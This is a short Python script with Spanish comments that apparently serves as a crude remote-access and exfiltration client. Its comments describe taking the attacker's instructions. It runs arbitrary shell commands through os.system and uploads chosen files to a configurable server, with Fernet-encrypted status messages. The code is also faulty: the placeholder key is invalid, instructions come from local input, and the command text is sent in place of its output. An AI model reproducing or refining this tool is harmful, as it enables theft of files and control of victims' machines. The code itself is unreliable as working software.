import requests
import os
from cryptography.fernet import Fernet
import subprocess
import sys

def instalar_dependencias():
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "-r", "requirements.txt"])
    except Exception as e:
        print(f"Error al instalar dependencias: {e}")
        sys.exit(1)

def main():
    # Intentar instalar dependencias
    instalar_dependencias()

    # Configuración del servidor
    url = "http://127.0.0.1:8000"  # Cambia a la URL del servidor

    # Generar llave de cifrado
    llave = b'your_secret_key_here'  # Usa una llave fija y segura

    while True:
        try:
            # Recibir instrucción del atacante
            instruccion = input("Ingrese una instrucción (comando, descargar, exit): ")

            if instruccion == "exit":
                break

            if instruccion.startswith("comando"):
                # Ejecutar comando
                comando = input("Ingrese el comando a ejecutar: ")
                os.system(comando)
                resultado = f"resultado:{comando}"
                mensaje_cifrado = Fernet(llave).encrypt(resultado.encode())
                requests.get(url, data=mensaje_cifrado)

            elif instruccion.startswith("descargar"):
                # Descargar archivo
                archivo = input("Ingrese el nombre del archivo a descargar: ")
                with open(archivo, "rb") as f:
                    contenido = f.read()
                requests.post(url, data=contenido)
                mensaje = f"archivo:{archivo}"
                mensaje_cifrado = Fernet(llave).encrypt(mensaje.encode())
                requests.get(url, data=mensaje_cifrado)

        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    main()
